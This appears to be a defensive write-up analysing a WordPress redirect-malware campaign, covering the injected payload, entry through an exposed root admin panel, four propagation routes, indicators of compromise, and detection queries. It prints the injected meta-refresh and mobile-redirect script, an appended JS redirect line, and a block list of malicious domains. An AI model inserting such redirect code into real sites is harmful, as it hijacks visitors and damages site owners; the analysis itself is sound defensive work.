# Anatomy of the Attack

How the campaign works, how to recognise it, and why the tools are built the
way they are.

---

## Symptom

The home page redirects to a foreign short URL after about seven seconds. On
mobile devices immediately.

---

## The payload

The same block is prepended to every row in `wp_posts.post_content`:

```html
<meta http-equiv="refresh" content="7; url=https://BAD.DOMAIN/TOKEN" />
<script>(window.matchMedia("(pointer:coarse)").matches
  ||/Android|iPhone|iPad|.../i.test(navigator.userAgent))
  &&location.replace("https://BAD.DOMAIN/TOKEN");</script>\r\n
```

The `<meta>` tag catches desktop visitors after seven seconds, the script
redirects touch devices immediately. The block is followed by a `\r\n` and
then the real content — that boundary is the anchor for the cleanup.

---

## Why database access, not a PHP backdoor

Four indicators that are conclusive together:

| Observation | Conclusion |
|---|---|
| `post_modified` untouched, rows from 2022 affected | WordPress did not save |
| `wp_global_styles`, `wp_navigation`, `oembed_cache` affected | row types WordPress never writes that way |
| `core verify-checksums` clean, no mu-plugins, no `eval` | no modified file |
| `home` in `wp_options` rewritten | a single `UPDATE` |

The entry that settled it: an auto-draft with
`guid = https://BAD.DOMAIN/TOKEN/?p=33`. WordPress builds guids from the
`home` option — so it was already hijacked when that row was created.

---

## The way in

A panel reachable from the internet on port 10000. It runs as root and offers
both a browser shell (`/xterm/`) and a MySQL module. That makes plain `UPDATE`
statements possible without touching a single file — exactly the picture the
findings show.

In the case examined: one failed login attempt, eight seconds later a
successful root login. **Only one** failed attempt — a brute-force attack
leaves hundreds. Whoever got in already knew the password.

> A browser shell means root access, and its keystrokes appear in **no** log.
> What happened during that time cannot be reconstructed.

---

## Four propagation routes

The database payload is only one of them. A database-only cleanup leaves the
others untouched — the site then keeps redirecting after the cleanup.

**1. `post_content` in the database** — the main route, see above.

**2. The `home` option.** Rewritten, WordPress builds *every* link and asset
URL with the malicious domain. That also explains the common side effect
"site without styling": every stylesheet goes nowhere.

**3. Appended to the end of JS files:**

```javascript
window.location.href = "//https://BAD.DOMAIN/TOKEN";
```

The doubled `//` before the protocol is the strongest single marker — no
developer writes a URL that way.

**4. Fake "coming soon" pages** as `.htm`, `.html` and `.php`. Static HTML
files are unusual in a WordPress installation to begin with.

---

## Secondary findings

**Orphaned WP-Cron hooks** with random names such as `hzorj91jc31tmgsbtay`,
hourly, with no registering code. Without code attached nothing happens — but
the name is a reliable marker, and the entries also came from a direct write
into `wp_options.cron`.

**Cached oEmbed markup.** While `home` was hijacked, WordPress built its embed
caches against the malicious domain:

```html
<blockquote class="wp-embedded-content" data-secret="…">…</blockquote>
<iframe … style="… visibility: hidden;" …></iframe>
```

Machine-generated, no text of your own.

**Database dumps in the webroot.** Retrievable through the browser, with
password hashes inside. Often left over from your own cleanup work.

---

## Three consequences for the tools

**The target domain differs per site.** In the case examined, three
installations pointed at three different domains of the same campaign. A scan
with a hard-coded domain reports affected sites as clean — which is why the
script reads it from the payload.

**Generic patterns outlive domain lists.** `<meta http-equiv=`, `"//http`,
random cron hook names — those survive any change of domain.

**Deleting line-wise is dangerous with JS.** Minified files often consist of a
single line; if the injection is appended to it, a `grep -v` destroys the
entire script. Only the injected statement is cut out instead.

---

## Indicators

### Domains

Observed in this incident:

```
urshort.com
ushort.company
ushort.org
```

Published by Sal Aguilar (WPSecurityAnalyzer) in May 2026 for the same
campaign:

```
u-short.net
urshort.live
ushort.com
ushort.dev
ushort.info
ushort.observer
ushort.today
```

Full machine-readable list:
[`blocklist-domains.txt`](https://github.com/mradeka/wp-redirect-toolkit/blob/main/blocklist-domains.txt)

> Check `ushort.com` before blocking — short generic domains change hands, and
> a wrong block only shows up late in production.

Paths follow the pattern `/[A-Za-z0-9]{10}` with an appended marker (`0r2`,
`0r3`, `0r4`, `0r5`) that apparently numbers the attack wave.

### Search patterns

```sql
SELECT COUNT(*) FROM wp_posts  WHERE post_content LIKE '<meta http-equiv=%';
SELECT option_name FROM wp_options WHERE option_value LIKE '%ushort%';
```

```bash
# JS: only the end of the file, that is where the injection sits
find . -name '*.js' -exec sh -c 'tail -c 800 "$1" | grep -q "\"//https\?:" && echo "$1"' _ {} \;

# landing pages
find . -maxdepth 3 \( -name '*.htm' -o -name '*.html' \) \
     ! -path '*/wp-content/themes/*' -exec grep -l 'http-equiv.*refresh' {} +
```

### Further markers

- cron hooks: 12+ characters, letters and digits mixed, no separators
- `home` and `siteurl` pointing at different hosts
- `post_content` starting with `<meta http-equiv="refresh"`
- auto-drafts whose `guid` contains a foreign domain
